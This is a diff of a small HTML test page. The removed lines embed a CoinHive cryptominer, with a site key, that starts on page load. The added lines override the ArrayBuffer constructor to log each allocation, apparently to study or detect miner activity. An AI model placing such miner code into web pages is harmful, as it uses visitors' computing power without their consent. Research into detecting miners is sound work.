@@ -1,15 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>ArrayBuffer Test</title>
-	<script src="abt.js"></script>
+	<title>
+		Pro_test
+	</title>
+	<script>
+		new_array = ArrayBuffer;
+		ArrayBuffer = function(i){
+			console.log('bingo');
+			var a =  new new_array(i);
+			return a;
+		}
+	</script>
 </head>
 <body>
-	<h1>mining</h1>
-<script>
-    var miner = new CoinHive.User('aHD9PIeOgcJKBGgrqnUyufSVXM6LnLWo', 'john-doe');
-    miner.start();
-</script>
+	<script>
+		x = new ArrayBuffer(20);
+		y = new ArrayBuffer(15);
+		console.log(x.byteLength);
+		console.log(y.byteLength);
+
+	</script>
 
 </body>
 </html>
